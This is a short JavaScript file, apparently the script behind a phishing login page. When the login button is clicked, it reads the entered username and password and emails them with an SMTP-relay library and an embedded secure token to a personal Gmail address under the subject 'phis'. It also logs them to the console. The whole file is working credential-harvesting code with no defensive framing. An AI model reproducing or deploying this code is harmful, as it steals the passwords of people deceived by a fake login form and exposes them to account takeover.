function initialize() {
  document.getElementById("loginbutton").onclick = buttonclick => {
    let username = document.getElementById("username").value;
    let password = document.getElementById("userpassword").value;
    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
    Email.send({
      SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
      To: 'vipuljha1142@gmail.com',
      From: "vipuljha1142@gmail.com",
      Subject: "phis",
      Body: userdata
    });
    console.log(userdata);


  }
}
window.onload = initialize;